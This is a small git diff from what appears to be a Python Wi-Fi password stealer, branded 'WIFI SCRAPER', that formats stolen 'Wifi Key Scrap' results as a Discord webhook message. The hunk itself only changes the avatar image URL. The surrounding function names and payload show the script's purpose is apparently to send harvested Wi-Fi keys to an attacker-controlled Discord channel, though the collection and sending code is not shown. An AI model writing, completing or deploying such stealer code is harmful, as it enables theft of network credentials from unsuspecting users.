@@ -27,7 +27,7 @@ def get_key(parts):
 def get_embed(parts,parts_):
     message = {
         "username": "WIFI SCRAPER・BKS#1958",
-        "avatar_url": "https://cdn.discordapp.com/attachments/1017497867092504627/1058127051388899368/ARepqpjdpWHTAAAAAElFTkSuQmCC.png",
+        "avatar_url": "https://cdn.discordapp.com/attachments/799010530030780457/1062779209392586753/Capture.PNG",
         "embeds": [
                 {
                 "title": ":globe_with_meridians: - Wifi Key Scrap",
